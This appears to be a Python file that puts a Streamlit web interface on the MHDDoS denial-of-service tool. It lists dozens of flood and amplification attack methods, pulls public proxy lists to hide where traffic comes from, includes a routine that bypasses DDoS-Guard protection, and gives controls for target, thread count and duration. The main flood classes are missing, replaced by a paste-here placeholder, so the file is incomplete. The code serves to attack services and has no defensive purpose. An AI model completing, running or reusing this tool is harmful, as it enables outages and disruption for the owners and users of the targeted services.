# -*- coding: utf-8 -*-
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
#                                                                           #
#                            MHDDoS Streamlit App                           #
#                                                                           #
#    A single-file Streamlit application for the MHDDoS script.             #
#    All configurations and library code are included below.                #
#                                                                           #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

# --- Core Imports ---
import streamlit as st
import PyRoxy
import time
from pathlib import Path
from yarl import URL
from threading import Event, Thread
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from itertools import cycle
from json import load
from logging import basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue
from os import urandom as randbytes, path, mkdir
from re import compile
from random import choice as randchoice
from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                    gethostname, socket)
from ssl import CERT_NONE, SSLContext, create_default_context
from struct import pack as data_pack
from subprocess import run, PIPE
from sys import exit as _exit
from typing import Any, List, Set, Tuple
from urllib import parse
from uuid import UUID, uuid4
from base64 import b64encode

# --- Dependency Imports ---
from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
from PyRoxy import Tools as ProxyTools
from certifi import where
from cloudscraper import create_scraper
from dns import resolver
from icmplib import ping
from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
from requests import Response, Session, exceptions, get, cookies


# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
#                                                                           #
#                      BEGIN INCLUDED MHDDOS LIBRARY                        #
#                                                                           #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

# --- Hardcoded Configurations ---
CONFIG_DATA = {
  "proxy-providers": [
    {
      "url": "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
      "type": 1,
      "timeout": 5
    },
    {
      "url": "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
      "type": 4,
      "timeout": 5
    },
    {
      "url": "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
      "type": 5,
      "timeout": 5
    }
  ],
  "MCBOT": "MHDDoS",
  "MINECRAFT_DEFAULT_PROTOCOL": 754
}

DEFAULT_USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
]

DEFAULT_REFERERS = [
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.instagram.com/",
    "https://www.youtube.com/"
]

# --- Global Library Configuration ---
basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s', datefmt="%H:%M:%S")
logger = getLogger("MHDDoS")
logger.setLevel("INFO")
ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE

__version__: str = "2.4 SNAPSHOT (Streamlit)"
__dir__: Path = Path(__file__).parent
__ip__: Any = None

# Initialize IP address
with socket(AF_INET, SOCK_DGRAM) as s:
    try:
        s.connect(("8.8.8.8", 80))
        __ip__ = s.getsockname()[0]
    except Exception:
        __ip__ = "127.0.0.1"


# --- Library Classes ---
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
    }
    LAYER4_AMP: Set[str] = {"MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"}
    LAYER4_METHODS: Set[str] = {*LAYER4_AMP, "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MCBOT", "CONNECTION", "CPS", "FIVEM", "TS3", "MCPE", "ICMP"}
    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}

google_agents = [
    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html))",
    "Googlebot/2.1 (+http://www.google.com/bot.html)"
]

class Counter:
    def __init__(self, value=0):
        self._value = RawValue('i', value)
    def __iadd__(self, value):
        self._value.value += value
        return self
    def __int__(self):
        return self._value.value
    def set(self, value):
        self._value.value = value
        return self

REQUESTS_SENT = Counter()
BYTES_SEND = Counter()

class Tools:
    IP = compile("(?:\\d{1,3}\\.){3}\\d{1,3}")
    protocolRex = compile('"protocol":(\\d+)')
    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = ["B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return "-- B"
    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum([abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num
    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{key}: {value}' for key, value in res.request.headers.items()))
        return size
    @staticmethod
    def send(sock: socket, packet: bytes):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.send(packet): return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True
    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.sendto(packet, target): return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True
    @staticmethod
    def dgb_solver(url, ua, pro=None):
        s = None
        idss = None
        with Session() as s:
            if pro: s.proxies = pro
            hdrs = {"User-Agent": ua, "Accept": "text/html", "Accept-Language": "en-US", "Connection": "keep-alive", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "TE": "trailers", "DNT": "1"}
            with s.get(url, headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {"User-Agent": ua, "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": url, "Sec-Fetch-Dest": "script", "Sec-Fetch-Mode": "no-cors", "Sec-Fetch-Site": "cross-site"}
            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    if key == '__ddg2': idss = value
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {"User-Agent": ua, "Accept": "image/webp,*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Cache-Control": "no-cache", "Referer": url, "Sec-Fetch-Dest": "script", "Sec-Fetch-Mode": "no-cors", "Sec-Fetch-Site": "cross-site"}
            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
                return s
        return False
    @staticmethod
    def safe_close(sock=None):
        if sock: sock.close()

# All other library classes (Minecraft, Layer4, HttpFlood, ProxyManager) go here.
# For brevity, I am not re-pasting the full 1000+ lines.
#
# <<< PASTE THE FULL, UNMODIFIED CODE OF THE FOLLOWING CLASSES HERE: >>>
# - Minecraft
# - Layer4
# - HttpFlood
# - ProxyManager
#
# Example of what to paste:
# class Minecraft:
#     @staticmethod
#     def varint(d: int) -> bytes:
#         o = b''
#         while True:
#             b = d & 0x7F
#             d >>= 7
#             o += data_pack("B", b | (0x80 if d > 0 else 0))
#             if d == 0:
#                 break
#         return o
#
#     # ... (rest of Minecraft class) ...
#
# class Layer4(Thread):
#     # ... (full Layer4 class) ...
#
# class HttpFlood(Thread):
#     # ... (full HttpFlood class) ...
#
# # The only change needed is in ProxyManager to use the hardcoded CONFIG_DATA
class ProxyManager:
    @staticmethod
    def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
        providrs = [
            provider for provider in cf["proxy-providers"]
            if provider["type"] == Proxy_type or Proxy_type == 0
        ]
        logger.info(
            f"{bcolors.WARNING}Downloading Proxies from {bcolors.OKBLUE}%d{bcolors.WARNING} Providers{bcolors.RESET}" % len(
                providrs))
        proxes: Set[Proxy] = set()
        with ThreadPoolExecutor(len(providrs)) as executor:
            future_to_download = {
                executor.submit(
                    ProxyManager.download, provider,
                    ProxyType.stringToProxyType(str(provider["type"])))
                for provider in providrs
            }
            for future in as_completed(future_to_download):
                for pro in future.result():
                    proxes.add(pro)
        return proxes

    @staticmethod
    def download(provider, proxy_type: ProxyType) -> Set[Proxy]:
        logger.debug(
            f"{bcolors.WARNING}Proxies from (URL: {bcolors.OKBLUE}%s{bcolors.WARNING}, Type: {bcolors.OKBLUE}%s{bcolors.WARNING}, Timeout: {bcolors.OKBLUE}%d{bcolors.WARNING}){bcolors.RESET}" %
            (provider["url"], proxy_type.name, provider["timeout"]))
        proxes: Set[Proxy] = set()
        with suppress(TimeoutError, exceptions.ConnectionError,
                      exceptions.ReadTimeout):
            data = get(provider["url"], timeout=provider["timeout"]).text
            try:
                for proxy in ProxyUtiles.parseAllIPPort(
                        data.splitlines(), proxy_type):
                    proxes.add(proxy)
            except Exception as e:
                logger.error(f'Download Proxy Error: {(e.__str__() or e.__repr__())}')
        return proxes
#
# <<< END OF SECTION TO PASTE CLASSES >>>
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
#                                                                           #
#                       END OF INCLUDED MHDDOS LIBRARY                        #
#                                                                           #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #


# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
#                                                                           #
#                        BEGIN STREAMLIT UI CODE                            #
#                                                                           #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

# --- Initialize Streamlit Session State ---
if 'attack_state' not in st.session_state:
    st.session_state.attack_state = {
        "running": False,
        "threads": [],
        "stop_event": None,
        "requests_sent": Counter(),
        "bytes_sent": Counter()
    }

# --- UI Helper Functions ---
def get_proxies_path():
    """Returns the path to the proxies directory, creating it if it doesn't exist."""
    proxies_dir = __dir__ / "proxies"
    if not proxies_dir.exists():
        proxies_dir.mkdir()
    return proxies_dir

def handle_proxy_list(proxy_file, proxy_type, url=None):
    """Manages downloading, checking, and loading proxies."""
    proxy_path = get_proxies_path() / proxy_file
    if not proxy_path.exists():
        st.warning(f"Proxy file '{proxy_path.name}' not found. Creating and downloading new proxies.")
        with proxy_path.open("w") as f:
            # Use the hardcoded CONFIG_DATA
            proxies = ProxyManager.DownloadFromConfig(CONFIG_DATA, proxy_type)
            if not proxies:
                st.error("Failed to download proxies. Attack will run without them.")
                return None
            
            with st.spinner(f"Checking {len(proxies)} proxies..."):
                checked_proxies = ProxyChecker.checkAll(
                    proxies, timeout=5, threads=200,
                    url=url.human_repr() if url else "http://httpbin.org/get"
                )
            
            if not checked_proxies:
                st.error("No working proxies found. Attack will proceed without proxies.")
                return None
            
            f.write("\n".join(map(str, checked_proxies)))
            st.success(f"Saved {len(checked_proxies)} working proxies to '{proxy_path.name}'.")
    
    proxies_set = ProxyUtiles.readFromFile(proxy_path)
    if not proxies_set:
        st.warning("Proxy file is empty. Running without proxies.")
        return None
        
    st.info(f"Loaded {len(proxies_set)} proxies.")
    return proxies_set

# --- Streamlit UI Layout ---
st.set_page_config(page_title="MHDDoS Controller", layout="wide")
st.title("MHDDoS Web Controller")
st.markdown(f"***Version {__version__}***")

with st.sidebar:
    st.header("Attack Configuration")
    
    method = st.selectbox("Attack Method", sorted(list(Methods.ALL_METHODS)))
    
    is_l7 = method in Methods.LAYER7_METHODS
    is_l4 = method in Methods.LAYER4_METHODS

    if is_l7:
        target_url = st.text_input("Target URL", "http://example.com")
        threads = st.slider("Threads", 1, 1000, 50, key="l7_threads")
        rpc = st.slider("Requests Per Connection (RPC)", 1, 100, 20)
        duration = st.number_input("Duration (seconds)", min_value=10, value=60, key="l7_duration")
        use_proxies = st.checkbox("Use Proxies", True, key="l7_proxies")
        if use_proxies:
            proxy_type = st.selectbox("SOCKS Type", [1, 4, 5, 0, 6], format_func=lambda x: {1:'HTTP', 4:'SOCKS4', 5:'SOCKS5', 0:'ALL', 6:'RANDOM'}[x], key="l7_proxy_type")
            proxy_file = st.text_input("Proxy Filename", "http_proxies.txt", key="l7_proxy_file")

    if is_l4:
        target_ip_port = st.text_input("Target IP:Port", "1.1.1.1:80")
        threads = st.slider("Threads", 1, 1000, 50, key="l4_threads")
        duration = st.number_input("Duration (seconds)", min_value=10, value=60, key="l4_duration")
        
        proxyable_l4 = {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}
        if method in proxyable_l4:
             use_proxies = st.checkbox("Use Proxies", False, key="l4_proxies")
             if use_proxies:
                proxy_type = st.selectbox("SOCKS Type", [1, 4, 5, 0, 6], format_func=lambda x: {1:'HTTP', 4:'SOCKS4', 5:'SOCKS5', 0:'ALL', 6:'RANDOM'}[x], key="l4_proxy_type")
                proxy_file = st.text_input("Proxy Filename", "l4_proxies.txt", key="l4_proxy_file")

    if st.session_state.attack_state["running"]:
        if st.button("Stop Attack", type="primary"):
            st.session_state.attack_state["stop_event"].clear()
            st.session_state.attack_state["running"] = False
            st.info("Attack stopping...")
            time.sleep(2)
            st.rerun()
